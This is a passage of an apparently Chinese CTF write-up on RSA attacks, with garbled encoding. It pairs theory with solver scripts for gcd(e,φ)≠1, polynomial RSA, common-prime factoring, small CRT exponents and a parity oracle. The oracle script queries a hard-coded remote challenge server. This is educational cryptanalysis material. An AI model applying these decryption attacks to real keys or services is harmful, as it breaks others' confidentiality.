==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h3 id="RSA-gcd-e-varphi-n-neq-1"><a href="#RSA-gcd-e-varphi-n-neq-1" class="headerlink" title="RSA - $gcd(e,\varphi(n)\neq 1)$"></a>RSA - $gcd(e,\varphi(n)\neq 1)$</h3><h4 id="Theorem-9"><a href="#Theorem-9" class="headerlink" title="Theorem"></a>Theorem</h4><p>$gcd(e,\varphi(n))\neq 1$æ—¶ï¼Œ$eâ€™\leftarrow e//gcd(e,\varphi(n)),d\leftarrow invert(eâ€™,\varphi(n))$ï¼Œ$c^{d}\equiv m^{gcd(e,\varphi(n))}\ mod\ n$</p><p>å·²çŸ¥$m^{gcd(e,\varphi(n))}$åæ”»å‡»æ–¹å‘ä¸å®šï¼Œè§†é¢˜ç›®è€Œå®š</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>De1CTF2019 - Baby RSA</p><p>æœ€åæ­¥éª¤çš„åŠ å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><p>p, q1, q2 å‡ä¸ºç´ æ•°ï¼Œ$f_{1}=gcd(e_{1},\varphi(pq_{1}))\neq 1,f_{2}=gcd(e_{2},\varphi(pq_{2}))\neq 1$</p><p>ä½†å‘ç°$gcd(e_{1},\varphi(pq_{1}))=gcd(e_{2},\varphi(pq_{2}))=14$ï¼Œäºæ˜¯å¯ä»¥ç”¨ext_gcdæ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f3, lcm = GCRT([n1, n2], [f1, f2])</span><br><span class="line"><span class="keyword">assert</span>(f3 % n1 == f1)</span><br><span class="line"><span class="keyword">assert</span>(f3 % n2 == f2)</span><br><span class="line"><span class="keyword">assert</span>(lcm == q1*q2*p)</span><br></pre></td></tr></table></figure><p>åˆå‘ç°gcd=14çš„å› å­7æ¥è‡ªpï¼Œæ‰€ä»¥ä»¤$n_{3}=q_{1}\cdot q_{2},c_{3}=f_{3}\%n_{3}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d3 = gmpy2.invert(<span class="number">7</span>, phi3)</span><br><span class="line">m3 = pow(c3, d3, n3)</span><br></pre></td></tr></table></figure><p>$m_{3}\equiv m^{2}\ mod\ n_{3}$</p><p>ä½œå°å…¬é’¥æŒ‡æ•°çš„çˆ†ç ´å³å¯.</p><p>ä½†må¦‚æœå¤ªå¤§æ—¶ï¼Œå°±è¦ç”¨åˆ°ä¸€äº›æœ‰é™åŸŸä¸Šå¼€äºŒæ¬¡æ ¹çš„ç®—æ³•ï¼Œåœ¨æœ¬æ–‡åé¢ä¼šæœ‰æ‰€æåŠ.</p><h3 id="RSA-Polynomial-based-RSA"><a href="#RSA-Polynomial-based-RSA" class="headerlink" title="RSA - Polynomial based RSA"></a>RSA - Polynomial based RSA</h3><h4 id="Theorem-10"><a href="#Theorem-10" class="headerlink" title="Theorem"></a>Theorem</h4><p>è®¾pä¸ºç´ æ•°ï¼Œ$F_{p}$ä¸ºpå…ƒæœ‰é™åŸŸï¼Œ$F_{p}$ä¸Šå¤šé¡¹å¼å½¢å¼çš„RSAæ˜¯åŸºäº$F_{p}$ä¸Šå¤šé¡¹å¼çš„ä¸€ä¸ªå·²çŸ¥å®šç†ï¼Œå¯ç±»æ¯”æ¬§æ‹‰å®šç†</p><p>è®¾$F_{p}[x]$æ˜¯$F_{p}$ä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ç¯ï¼ŒPå’ŒQä¸º$F_{p}(x)$ä¸Šçš„æ—¢çº¦å¤šé¡¹å¼ï¼Œ$N=P\cdot Q$ï¼Œ$F_{p}[x]$çš„æ¨¡Nå•†ç¯ä¸‹çš„å¤šé¡¹å¼Mæ»¡è¶³gcd(M,N)=1</p><p>åˆ™$M^{\varphi(N)}=1$ï¼ˆå¯¹äºå¤šé¡¹å¼ä¸‹çš„$\varphi(N)$ï¼Œä¸åŒäºZZä¸ŠRSAçš„$(p-1)\cdot (q-1)$ï¼Œä½†åŸºæœ¬å®šä¹‰ç›¸åŒï¼Œå³åº¦å°äºdegree(N)çš„æ‰€æœ‰æ»¡è¶³gcd(*,N)çš„å¤šé¡¹å¼*ï¼‰</p><p>$\because$ P, Qå‡ä¸ºæ—¢çº¦å¤šé¡¹å¼ï¼Œ<br>$\therefore\varphi(P)=p^{P.degree()}-1,\varphi(Q)=p^{Q.degree()}-1,\varphi(N)=(p^{P.degree()}-1)\cdot (p^{Q.degree()}-1)$</p><p>åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ˜æ–‡mçš„å¤šé¡¹å¼è¡¨ç¤ºæ–¹æ³•å¤§è‡´æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li><p>å¯¹åº”asciiç ä½œå¤šé¡¹å¼ç³»æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_irreducable_poly</span><span class="params">(deg)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        <span class="keyword">if</span> out.is_irreducible():</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line">       </span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">N = P*Q</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'xxxx'</span></span><br><span class="line">flag = list(bytearray(flag.encode()))</span><br><span class="line">m = S(flag)</span><br><span class="line">c = m^e</span><br></pre></td></tr></table></figure></li><li><p>åœ¨$GF(p^{nbits})$ä¸Šfetch_int</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">P.&lt;x&gt;=PolynomialRing(GF(p))</span><br><span class="line"><span class="comment">## ç•¥å»P,Q,Nç”Ÿæˆä»£ç </span></span><br><span class="line">R.&lt;y&gt; = GF(p^<span class="number">2049</span>)</span><br><span class="line">m_int = Integer(bytes_to_long(flag))</span><br><span class="line">m_poly = P(R.fetch_int(m_int))</span><br><span class="line">c_poly = pow(m_poly, e, n)</span><br><span class="line">c_int = R(c_poly).integer_representation()</span><br></pre></td></tr></table></figure></li></ol><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line">N = </span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">p, q = N.factor()</span><br><span class="line">p, q = p[<span class="number">0</span>], q[<span class="number">0</span>]</span><br><span class="line">phi = (p**P.degree()<span class="number">-1</span>)*(p**Q.degree()<span class="number">-1</span>)</span><br><span class="line">e = </span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c^d</span><br><span class="line">print(<span class="string">""</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.list()]))</span><br></pre></td></tr></table></figure><h3 id="RSA-Large-Common-Factor-of-p-1-and-q-1"><a href="#RSA-Large-Common-Factor-of-p-1-and-q-1" class="headerlink" title="RSA -  Large Common Factor of  p-1 and q-1"></a>RSA -  Large Common Factor of  p-1 and q-1</h3><h4 id="Theorem-11"><a href="#Theorem-11" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given $N=pq,g|(p-1),g|(q-1)$. (We call it common prime RSA)</p><p>If g is large enough, we have an efficient factoring method for N. (é­”æ”¹rho)</p><p>[å¯è¡Œåˆ†æ]</p><p>$p-1=ga,q-1=gb,N-1=gh(h=gab+a+b)$<br>$\therefore x^{N-1}\ (mod\ p)$è‡³å¤šæœ‰aä¸ªå€¼<br>$\therefore$ç”¨$x\rightarrow x^{N-1}+3$ä»£æ›¿rhoä¸­çš„è¿­ä»£å‡½æ•°ï¼Œèƒ½åœ¨$O(\sqrt a)=O(N^{1/4-\gamma /2})$ä¸‹åˆ†è§£N.</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (pow(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(abs(a - b), n)</span><br><span class="line">            print(<span class="string">'&#123;&#125; in &#123;&#125; circle'</span>.format(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">2062899536811871554818178359324161185631864322612928428737135410318396234838612759353304630466467882907238599097155276236974469077407927587176395102072905755064272779705304103155044175760772870357960042973800466612294120431806053764425995115279842108284227580763784948966673592802930476849233889221985236020626654664840038198318033843640935727802767372332931755961464416884826343968074190784107977317020369409515252779597705798495979144688260140280406347997234735504377161004933444363855269475346955181189441066456092467816293921375731674289071178645028262851698651731976240122083422857066357348367076175249101149547</span></span><br><span class="line">    print(rho(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>common prime RSAåœ¨gè¿‡å°æ—¶ï¼Œgä¹Ÿèƒ½è½»æ˜“é€šè¿‡åˆ†è§£N-1æ¥è§£å‡ºï¼ˆrhoç­‰ç®—æ³•åˆ†è§£å‡ºçš„å°å› å­å°è¯•å³å¯ï¼‰</p><p>å…³äºè¿™ç±»çš„é¢˜å‹æˆ‘è¿˜æ²¡åœ¨CTFèµ›é¢˜ä¸­è§åˆ°è¿‡ï¼Œä¸‹é¢ç»™å‡ºç”Ÿæˆçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    g = <span class="number">2</span> * getPrime(int(nbits * gamma))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">        p = g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">            q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> GCD(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">                q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    lcm = (p * q) // GCD(p, q)</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> GCD(e, lcm) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    d = inverse(e, lcm)</span><br><span class="line">    <span class="keyword">return</span> (n, e), (p, q, d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    (n, e), (p, q, d) = gen_key(<span class="number">2048</span>, <span class="number">0.485</span>)</span><br><span class="line">    print(<span class="string">'n ='</span>, n)</span><br><span class="line">    print(<span class="string">'p ='</span>, p)</span><br><span class="line">    print(<span class="string">'q ='</span>, q)</span><br><span class="line">    print(<span class="string">'e ='</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="RSA-Small-CRT-Private-Exponents"><a href="#RSA-Small-CRT-Private-Exponents" class="headerlink" title="RSA - Small CRT Private Exponents"></a>RSA - Small CRT Private Exponents</h3><h4 id="Theorem-12"><a href="#Theorem-12" class="headerlink" title="Theorem"></a>Theorem</h4><p>å¹³è¡¡çš„RSA-CRTå¯†ç ç³»ç»Ÿä¸‹ï¼Œq&lt;p&lt;2q. ä¸”æ»¡è¶³$ed_{p}\equiv 1(mod\ p-1),ed_{q}\equiv 1(mod\ q-1)$</p><p>åˆ™$d_{p},d_{q}&lt;min\\{\frac{1}{4}(\frac{N}{e})^{\frac{2}{5}},\frac{1}{3}N^{\frac{1}{4}}\\}$æˆç«‹æ—¶ï¼Œå¯æœ‰æ•ˆç ´è§£RSA-CRTç®—æ³•.</p><script type="math/tex; mode=display">\because ed_{p}=1+k(p-1),ed_{q}=1+l(q-1)\\\\\therefore e^{2}d_{p}d_{q}+kl(1-N)+e(d_{p}(l-1)+d_{q}(k-1))=k+l-1.\\\\ä»¤x=d_{p}(l-1)+d_{q}(k-1),y=kl,z=k+l-1,\omega =d_{p}d_{q}\\\\æœ‰ex+(1-N)y+e^{2}\omega = z,çŸ©é˜µè¡¨ç¤ºä¸‹åˆ™ä¸º</script><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-34-31.png" alt></p><p>æ„é€ ä¸€ç»„åŸºå¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-36-36.png" alt></p><p>æˆ‘ä»¬æœ‰å¦‚ä¸‹ç»“è®ºï¼š</p><p>è®°$v_{0}=(4ex,4N^{\frac{1}{2}}y,e^{\frac{3}{5}}N^{\frac{2}{5}}z)$. åˆ™å¯ä»¥çœ‹å‡º$v_{0}$ä¸€å®šæ˜¯Lçº¦åŒ–åŸºçš„ä¸‰ä¸ªè¡Œå‘é‡çš„çº¿æ€§ç»„åˆ.</p><p>LLLè®¡ç®—åçš„çº¦åŒ–åŸº$\\{b_{1},b_{2},b_{3}\\}$ï¼Œé€‰å–ä¸€ä¸ªé€‚å½“çš„ä¸Šç•ŒMï¼Œä»¤$|a_{i}|\leq M$, åˆ™éªŒè¯çº¿æ€§ç»„åˆ$v=a_{1}b_{1}+a_{2}b_{2}+a_{3}b_{3}$å¯¹åº”çš„$x,y,z,\omega$ï¼Œçœ‹å¾—åˆ°çš„æ•°æ®èƒ½å¦æ­£ç¡®åˆ†è§£Nå³å¯.</p><p>Mè§†å…·ä½“æƒ…å†µè€Œå®š</p><h4 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h4><p>æš‚æ— ï¼ˆå› ä¸ºç”Ÿæˆæ»¡è¶³è¦æ±‚çš„$d_{p},d_{q}$ä»¥åŠä½¿å¯¹åº”çš„$d&gt;N^{0.292}$æœ‰ç‚¹å›°éš¾ï¼‰</p><h3 id="RSA-Parity-Oracle"><a href="#RSA-Parity-Oracle" class="headerlink" title="RSA - Parity Oracle"></a>RSA - Parity Oracle</h3><h4 id="Theorem-13"><a href="#Theorem-13" class="headerlink" title="Theorem"></a>Theorem</h4><p>å‡è®¾å­˜åœ¨ä¸€ä¸ªoracleï¼Œèƒ½å¯¹ç»™å®šå¯†æ–‡è¿›è¡Œè§£å¯†å¹¶ç»™å‡ºå¯¹åº”æ˜æ–‡çš„å¥‡å¶ä¿¡æ¯ï¼Œåˆ™æˆ‘ä»¬åªéœ€è¦log(N)æ¬¡å°±èƒ½è§£å¯†ä»»æ„å¯†æ–‡.</p><p>$c\equiv m^{e}(mod\ N)$, å‘oracleæœºå‘é€$2^{e}c\equiv (2m)^{e}(mod\ N)$,åˆ™è¿”å›å¥‡æ—¶ï¼Œè¯´æ˜$2m&gt;N$ï¼Œåä¹‹$2m&lt;N$</p><p>ç»§ç»­å¾€ä¸‹åˆ†æï¼Œæ­¤æ—¶å‘é€$(2^{2})^{e}c(mod\ N)$, å¦‚æœå…ˆå‰è¿”å›å¥‡ï¼Œåˆ™æ­¤æ—¶ç­‰åŒäºåœ¨æ ¡éªŒ$2(2m-N)$ä¸Nçš„å¤§å°å…³ç³»ï¼Œå³è¿”å›å¥‡è¯´æ˜$m\in (\frac{3N}{4},N)$ï¼Œåä¹‹$m\in (\frac{N}{2},\frac{3N}{4})$ï¼Œå…ˆå‰è¿”å›å¶çš„è¿™ä¸€è½®æ¬¡ä¸å†åˆ†æ</p><p>æ¥ä¸‹æ¥è½®æ¬¡ä¹Ÿç±»ä¼¼ï¼ŒäºŒåˆ†log(N)æ¬¡å³å¯.</p><h4 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    io = remote(<span class="string">'111.198.29.45'</span>, <span class="string">'42484'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'You can input ciphertext(hexdecimal) now\n'</span>)</span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(c) &amp; <span class="number">1</span>:</span><br><span class="line">        c = <span class="string">'0'</span> + c</span><br><span class="line">    io.sendline(c)</span><br><span class="line">    res = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">assert</span>(res == <span class="string">b'odd'</span> <span class="keyword">or</span> res == <span class="string">b'even'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">b'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    nbits = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = nbits</span><br><span class="line">    low = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    high = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbits):</span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            high = (low + high) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = (low + high) / <span class="number">2</span></span><br><span class="line">        print(i, <span class="string">'/'</span>, nbits)</span><br><span class="line">    <span class="keyword">return</span> int(high)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c = int(input("c = "))</span></span><br><span class="line">    <span class="comment">#e = int(input("e = "))</span></span><br><span class="line">    <span class="comment">#n = int(input("n = "))</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    m = partial(c, e, n)</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="RSA-Williamâ€™s-p-1-and-Pollardâ€™s-p-1"><a href="#RSA-Williamâ€™s-p-1-and-Pollardâ€™s-p-1" class="headerlink" title="RSA - Williamâ€™s p+1 and Pollardâ€™s p-1"></a>RSA - Williamâ€™s p+1 and Pollardâ€™s p-1</h3><h4 id="Theorem-14"><a href="#Theorem-14" class="headerlink" title="Theorem"></a>Theorem</h4><p>å¦‚æœè¦åˆ†è§£çš„NåŒ…å«çš„ç´ æ•°å› å­pï¼Œä½¿å¾—p+1æˆ–p-1æ˜¯å¹³æ»‘çš„ï¼ˆå³åªæœ‰é€‚å½“ä¸Šç•Œçš„å°å› å­ï¼‰ï¼Œåˆ™Williamâ€™s p+1å’ŒPollardâ€™s p-1ç®—æ³•èƒ½å¾ˆå¥½å®ç°åˆ†è§£.</p><ul><li><p>Williamâ€™s p+1 Algorithm</p><p>Step 1ï¼šé€‰æ‹©æ•´æ•°A(A&gt;2)æ¥è¡¨å¾å¢å¡æ–¯åºåˆ—$V_{j}=AV_{j-1}-V_{j-2}$ï¼Œå¹¶åˆå§‹åŒ–$V_{0}=2,V_{1}=A$.</p><p>Step 2ï¼šè®¡ç®—åºåˆ—åˆ°$j=m!$.</p><p>â€‹            